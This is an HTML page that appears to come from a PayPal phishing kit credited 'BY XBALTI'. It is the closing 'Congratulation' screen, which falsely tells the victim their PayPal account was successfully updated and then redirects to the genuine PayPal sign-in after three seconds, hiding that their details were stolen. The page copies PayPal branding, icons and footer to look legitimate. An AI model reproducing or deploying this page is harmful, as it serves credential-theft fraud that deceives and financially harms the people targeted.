<!--  
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                     
-->
<!DOCTYPE html>
<html>
<head>
    <title>PayPal: Congratulation</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./img/pp144.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="./img/pp114.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="./img/pp72.png">
    <link rel="apple-touch-icon-precomposed" href="./img/pp64.png">
    <link rel="shortcut icon" sizes="196x196" href="./img/pp196.png">
    <link rel="shortcut icon" type="image/x-icon" href="./img/favicon.ico">
    <link rel="icon" type="image/x-icon" href="./img/pp32.png">
    <link rel="stylesheet" href="css/2.css" >
</head>

<body class="">
    <div id="app-element-mountpoint">
        <div id="document-body" data-reactroot="" data-reactid="1">
            <div class="background" data-reactid="2">
                <div  data-reactid="4">
                    <div id="document-tratki" class="signup clear app-wrapper " data-reactid="5">
                        <div class="signup-page-header" data-reactid="6"><a href="#" onclick="openNav()" class="signup-page-header-logo" data-reactid="7">Paypal</a><a href="#" onclick="openNav()" class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary " data-reactid="8">Log Out</a></div>
                        <main data-reactid="9">
                            <div data-reactid="10">
                                <div class="signup-page-form" data-reactid="12">
                                    <div class="notification" data-reactid="13"></div>
                                    <div data-reactid="14">
                                          <div id="spinner" style="display:none;">
                                       <div class="notification"></div>
                                                     <div class="busyIcon"></div>
                                                    <div class="busyOverlay"></div>
                                        </div>
                                        
                                        <div id="chokran" class="signupAppContent" >
                                            <div data-reactid="18">
                                                <div class="" style="margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
                                                    <h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Congratulation !</h1></div>
                                            </div>
                                            <hr>
                                            <center>
                                                <h4 style="color: #6c7378;">Dear Customer, your PayPal Account has been <a style="color: #4caf50;" >Successfully</a> updated </h4> <img src="img/Success.gif" width="150px">
                                                <div class="fieldGroupContainer" data-reactid="23">
                                                    <div>
                                                        <h4>Impact on account: <a style="color: #4caf50;">Low</a></h4>
                                                        <h3>Click the link below or wait 10 seconds, we will redirect you automatically to your <a style="color: #0070b;">PayPal</a> account</h3>
                                                       
                                                        <br>
                                                        <div class="btn-content-last">
                                                            <a href="https://www.paypal.com/signin" class="vx_btn"> My PayPal </a>
                                                            
                                                        </div>
 
                                                    </div>
                                                </div>
                                            </center>
       
                                        </div>
                                    </div>
                                    <div class="signup-page-footer vx_text-legal text-center" data-reactid="87"> ©1999-2018 Paypal, Inc. All rights reserved.<span class="signup-page-footer-separator" data-reactid="89">|</span><a href="#" data-reactid="90" pa-marked="1">Privacy</a><span class="signup-page-footer-spacer" data-reactid="91">&nbsp;</span><a href="#" data-reactid="92" pa-marked="1">Legal</a><span class="signup-page-footer-spacer" data-reactid="93">&nbsp;</span><a href="#" data-reactid="94" pa-marked="1">Contact</a><span class="signup-page-footer-spacer" data-reactid="95">&nbsp;</span><span data-reactid="96"><a style="cursor:pointer;" data-reactid="97" pa-marked="1">Feedback</a></span>
                                        <a href="#" data-reactid="99" pa-marked="1"></a>
                                    </div>
                                </div>
                            </div>
                        </main>
                        <div id="injectedUnifiedLogin" style="height:0px;width:0px;visibility:hidden;over-flow:hidden;" data-reactid="115"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<script type="text/javascript">
       window.setTimeout("location=('https://www.paypal.com/signin');", 3000);
</script>
</body>

</html>